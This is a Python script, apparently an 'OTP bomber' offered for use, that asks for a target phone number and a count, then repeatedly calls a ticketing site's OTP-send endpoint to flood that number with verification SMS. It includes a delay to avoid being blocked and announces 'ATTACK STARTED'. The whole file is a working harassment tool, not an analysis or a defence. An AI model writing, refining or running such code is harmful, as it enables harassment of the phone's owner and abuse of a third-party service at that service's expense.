import requests, os, time, uuid

def start():
    os.system('clear')
    # আপনার স্ক্রিনশট অনুযায়ী একদম নিখুঁত রঙিন ব্যানার
    print('''\033[1;31m
███\033[1;32m███\033[1;33m██\033[1;34m██\033[1;35m██\033[1;36m██\033[1;37m██\033[1;32m██
██\033[1;33m█\033[1;34m██\033[1;35m█\033[1;36m██\033[1;31m  ██\033[1;32m██  \033[1;33m██
██ \033[1;34m█\033[1;35m ██\033[1;36m  ██\033[1;31m  ██\033[1;32m  ██
██   \033[1;31m██\033[1;32m  ██\033[1;33m  ██\033[1;34m  ██\033[0m''')

    # আপনার দেওয়া তথ্য অনুযায়ী ইনফরমেশন বক্স
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY : MD MALEK ISLAM         |')
    print('| [✓] GITHUB       : MR-MALAK               |')
    print('| [✓] TELEGRAM     : md_malek               |')
    print('| [✓] TOOL STATUS  : OTP BOMBER (META)      |')
    print('| [✓] TOOL VERSION : MAX PRO 2026           |\033[0m')
    print(line)

    # কি (Key) স্টাইল আপনার স্ক্রিনশট অনুযায়ী
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[▼] KEY : {u_key}-MR-MALAK\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))

    # ১০০% কাজ করা আপডেট এপিআই হেডার
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36"
    }

    print(f'\n\033[1;32m[✓] ATTACK STARTED ==> {target}\033[0m\n')

    for i in range(1, amount + 1):
        try:
            # সচল এপিআই রিকোয়েস্ট
            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
            print(f'\033[1;32m[{i}] META SUCCESS ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] META FAILED\033[0m')

        # ব্লকিং এড়াতে ৩ সেকেন্ড গ্যাপ
        time.sleep(3)

if __name__ == "__main__":
    start()
